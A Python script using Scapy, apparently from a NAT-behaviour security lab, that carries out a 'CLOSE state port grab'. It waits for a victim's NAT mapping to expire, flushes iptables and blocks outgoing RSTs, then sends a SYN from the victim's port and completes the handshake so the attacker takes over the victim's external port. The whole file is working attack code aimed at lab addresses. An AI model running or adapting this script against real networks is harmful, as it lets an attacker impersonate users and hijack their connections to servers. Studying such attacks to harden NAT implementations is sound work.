#!/usr/bin/env python3
"""
Attack: CLOSE State — Immediate Port Grab
==========================================
When a TCP connection enters CLOSE state (RST sent), the NAT mapping
expires in ~10s. The attacker grabs the victim's port immediately after
expiry to impersonate the victim for future connections.

Attack flow:
    1. State inferencer detected CLOSE on victim's port
    2. Wait for mapping to fully expire (~15s to be safe)
    3. Attacker sends SYN using victim's port as source port
    4. NAT creates new mapping: attacker's IP → victim's old external port
    5. Attacker now owns that port on the router's external IP
    6. Any server response to that port goes to attacker

Impact: Attacker impersonates victim for new connections to the server.

Usage:
    sudo python3 attack_close.py <port>

Example:
    # After state_inferencer.py reports CLOSE:
    sudo python3 attack_close.py 50002
"""

from scapy.all import *
import time, sys, os, signal

SERVER_IP   = "20.0.0.20"
SERVER_PORT = 8080
NAT_EXT_IP  = "20.0.0.1"
ATTACKER_IP = "30.0.0.30"

CLOSE_TIMEOUT =  60 #it this long to ensure mapping is fully expired


def signal_handler(sig, frame):
    print("\n[!] Interrupted")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def setup():
    if os.geteuid() != 0:
        print("[!] Run as root")
        sys.exit(1)
    os.system("iptables -F OUTPUT 2>/dev/null")
    os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {SERVER_IP} -j DROP")
    print("[+] iptables: outgoing RSTs blocked")


def cleanup():
    os.system("iptables -F OUTPUT 2>/dev/null")


def attack_port_grab(port):
    print(f"\n{'='*60}")
    print(f"  ATTACK: CLOSE State — Immediate Port Grab")
    print(f"  Target port: {port}")
    print(f"  Server: {SERVER_IP}:{SERVER_PORT}")
    print(f"{'='*60}\n")

    # Step 1: Wait for CLOSE mapping to expire
    print(f"[*] Step 1: Waiting {CLOSE_TIMEOUT}s for mapping to expire...")
    time.sleep(CLOSE_TIMEOUT)
    print(f"[+] Mapping should now be expired\n")

    # Step 2: Send SYN using victim's port to grab the mapping
    print(f"[*] Step 2: Sending SYN to server using victim's port {port}...")
    syn_pkt = IP(dst=SERVER_IP) / TCP(
        sport=port, dport=SERVER_PORT, flags="S",
        seq=RandInt()
    )
    send(syn_pkt, verbose=0)
    print(f"[+] SYN sent: {ATTACKER_IP}:{port} → {SERVER_IP}:{SERVER_PORT}")

    # Step 3: Listen for SYN-ACK from server
    print(f"[*] Step 3: Waiting for server SYN-ACK...")
    pkts = sniff(
        filter=f"tcp and src host {SERVER_IP} and dst port {port}",
        timeout=3,
        count=1
    )

    if pkts and TCP in pkts[0] and pkts[0][TCP].flags & 0x12:  # SYN-ACK
        server_seq = pkts[0][TCP].seq
        server_ack = pkts[0][TCP].ack
        print(f"[+] SYN-ACK received from server!")
        print(f"    Server SEQ: {server_seq}")
        print(f"    Server ACK: {server_ack}")

        # Step 4: Complete handshake — send ACK
        print(f"[*] Step 4: Completing handshake (sending ACK)...")
        ack_pkt = IP(dst=SERVER_IP) / TCP(
            sport=port, dport=SERVER_PORT, flags="A",
            seq=server_ack, ack=server_seq + 1
        )
        send(ack_pkt, verbose=0)

        print(f"\n[+] ════════════════════════════════════════════")
        print(f"[+]  ATTACK SUCCESS!")
        print(f"[+]  Port {port} grabbed — attacker now owns this mapping")
        print(f"[+]  NAT mapping: {ATTACKER_IP}:{port} → {NAT_EXT_IP}:{port}")
        print(f"[+]  Server thinks attacker is the original victim")
        print(f"[+] ════════════════════════════════════════════\n")
        return True
    else:
        print(f"[-] No SYN-ACK received — port may still be occupied")
        print(f"[-] Try increasing wait time or verify state is CLOSE")
        return False


def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 attack_close.py <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    setup()
    try:
        success = attack_port_grab(port)
    finally:
        cleanup()
        print("[*] iptables cleaned up")

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
